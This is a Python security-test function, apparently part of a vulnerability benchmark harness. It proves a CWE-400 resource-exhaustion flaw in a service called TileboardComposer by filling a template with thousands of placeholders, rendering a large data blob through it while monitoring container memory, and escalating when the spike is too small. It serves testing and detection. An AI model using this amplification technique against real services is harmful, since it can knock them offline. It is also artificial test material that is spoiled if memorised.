...
def sec_test_uncontrolled_resource_consumption(
    ...
    """
    PoC for CWE-400: Uncontrolled Resource Consumption in TileboardComposer.

    Strategy:
    - Place a server-side template with thousands of repeated {{blob}} placeholders.
    - Create a board and append a tile whose data.blob is a ~100 KiB string prefixed with a unique marker.
    - Trigger /boards/{id}/render while monitoring container memory usage.
    - If the spike is insufficient, increase amplification by rewriting the template with more placeholders
      and optionally appending a second identical tile, then re-render and re-monitor.

    Success criterion:
    - monitor_container_resources reports memory usage above ~150 MiB during render, or
    - observed memory delta exceeds ~150 MiB.

    Returns:
      {cwes.CWE.UNCONTROLLED_RESOURCE_CONSUMPTION} on success, else set().
    """
    findings: set[cwes.CWE] = set()
    template_name = "welcome.html"
    board_name = "PoC-Resource-Amplify"
    marker = generate_marker()  # do not log or print

    # Tunables for controlled impact
    data_sizes = [100 * 1024]  # start with 100 KiB payload
    placeholder_counts = [2000, 3000]  # try 2000 first, escalate to 3000 if needed
    memory_threshold = 150 * 1024 * 1024  # 150 MiB
    monitor_duration_sec = 12
    render_timeout_sec = 30.0

    def build_template_content(repetitions: int) -> str:
        # Keep content small while creating large expansion at render time
        return "<div>" + ("{{blob}}" * repetitions) + "</div>\n"

    def start_render_async(board_id: str) -> tuple[threading.Thread, dict]:
        """
        Start render in a background thread so we can monitor resources concurrently.
        Returns (thread, result_dict) where result_dict will be filled with:
          {"ok": bool, "status": Optional[int], "error": Optional[str]}
        """
        info: dict = {"ok": False, "status": None, "error": None}

        def _run():
            try:
                url = f"{base_url(app)}/boards/{board_id}/render"
                app.logger.info("Issuing render GET %s", url)
                # Use stream=True to avoid downloading massive body into client memory
                r = requests.get(url, timeout=render_timeout_sec, stream=True)
                info["status"] = r.status_code
                # Do not read the whole body; optionally read a tiny chunk to ensure server started streaming
                try:
                    next(r.iter_content(chunk_size=1024))
                except Exception:
                    pass
                info["ok"] = 200 <= r.status_code < 600
            except Exception as e:
                info["error"] = str(e)
    ...
    try:
        # Step 1: Place initial amplification template
        tpl_content = build_template_content(placeholder_counts[0])
        app.logger.info(
            "Placing template %s with %d placeholders",
            template_name,
            placeholder_counts[0],
        )
        ensure_template(app, template_name, tpl_content)

        # Step 2: Create a new board
        app.logger.info("Creating board %s", board_name)
        resp = create_board(app, board_name)
        if resp.status_code != 201:
            app.logger.warning(
                "Failed to create board: %s %s",
                resp.status_code,
        ...
        board_id = board.get("id")
        if not board_id or not is_uuid(board_id):
            app.logger.warning("Invalid board id in response: %s", board)
            return findings
        app.logger.info("Created board with id %s", board_id)

        # Step 3: Append a tile with large data value
        data_size = data_sizes[0]
        large_value = marker + ("A" * data_size)
        app.logger.info(
            "Appending tile with data.blob size ~%d bytes", len(large_value)
        )
        resp = append_tile(app, board_id, template_name, {"blob": large_value})
        if resp.status_code != 201:
            app.logger.warning(
                "Failed to append tile: %s %s",
                resp.status_code,
                resp.text if hasattr(resp, "text") else "",
            )
            return findings
        tile = resp.json()
        app.logger.info("Appended tile at index %s", tile.get("index"))

        # Step 4: Trigger render while monitoring resources
        def try_render_with_monitor() -> bool:
            mem_before = 0
            mem_after = 0
            try:
                mem_before = memory_usage(app.container_id)
                app.logger.info(
                    "Memory before render: %.2f MiB", mem_before / (1024 * 1024)
                )
            except Exception as e:
                app.logger.debug("Failed to read memory before: %s", e)

            t, info = start_render_async(board_id)
            # Let the request hit the server
            time.sleep(0.5)
            app.logger.info(
                "Monitoring container resources for %d seconds (threshold ~%.1f MiB)",
            ...
            # Give the render thread a moment to finish, but don't block indefinitely
            t.join(timeout=2.0)

            try:
                mem_after = memory_usage(app.container_id)
                app.logger.info(
                    "Memory after render: %.2f MiB", mem_after / (1024 * 1024)
                )
            except Exception as e:
                app.logger.debug("Failed to read memory after: %s", e)

            delta = mem_after - mem_before if (mem_after and mem_before) else 0
            if delta > 0:
                app.logger.info(
                    "Observed memory delta during render: %.2f MiB",
                    delta / (1024 * 1024),
                )

            if exceeded:
                app.logger.info(
                    "Resource threshold exceeded during render (likely CWE-400)."
                )
                return True

            if delta >= memory_threshold:
                app.logger.info("Large memory delta observed (>= threshold).")
                return True

            # Log render outcome for context
            if info.get("error"):
                app.logger.info(
                    "Render thread error (may indicate server stress): %s",
                    info["error"],
                )
            else:
                app.logger.info(
                    "Render thread completed with status: %s", info.get("status")
                )

            return False

        success = try_render_with_monitor()

        # If not sufficient, scale up amplification:
        if not success:
            app.logger.info(
                "Initial attempt did not exceed threshold; scaling up amplification."
            )
            # Option A: Increase placeholder count in template
            if len(placeholder_counts) > 1:
                new_count = placeholder_counts[1]
                app.logger.info(
                    "Rewriting template %s with %d placeholders",
                    template_name,
                    new_count,
                )
                ensure_template(app, template_name, build_template_content(new_count))
            # Option B: Add a second identical tile to multiply output
            app.logger.info("Appending a second tile to multiply rendered output")
            resp2 = append_tile(app, board_id, template_name, {"blob": large_value})
            if resp2.status_code != 201:
                app.logger.warning(
                    "Failed to append second tile: %s %s",
                    resp2.status_code,
                    resp2.text if hasattr(resp2, "text") else "",
                )

            # Retry render with monitoring
            success = try_render_with_monitor()
        ...
        if success:
            ...
            app.logger.info(
                "Did not observe sufficient resource spike to confirm CWE-400 in this run."
            )

        return findings
    except Exception as e:
        app.logger.exception("Exception during CWE-400 PoC: %s", e)
        return findings
